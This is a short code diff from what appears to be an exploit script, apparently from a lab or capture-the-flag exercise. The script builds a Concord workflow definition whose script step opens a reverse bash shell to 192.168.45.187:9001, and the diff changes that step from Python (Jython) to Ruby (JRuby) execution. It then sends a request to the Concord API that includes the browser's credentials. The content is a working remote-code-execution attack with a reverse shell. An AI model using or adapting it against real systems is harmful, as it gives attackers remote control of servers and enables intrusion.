@@ -4,17 +4,16 @@
 yml = `
 configuration:
   dependencies:
-  - "mvn://org.python:jython-standalone:2.7.2"
+  - "mvn://org.jruby:jruby:9.4.2.0"
 
 flows:
   default:
-  - script: python
+  - script: ruby
     body: |
       cmd = "/bin/bash -i >& /dev/tcp/192.168.45.187/9001 0>&1"
-      import subprocess
-      subprocess.call(cmd, shell=True)
+      pid = spawn(cmd)
+      Process.wait pid
 `
-console.log(yml)
 
 fetch("http://concord:8001/api/service/console/whoami", {
 	credentials: 'include'
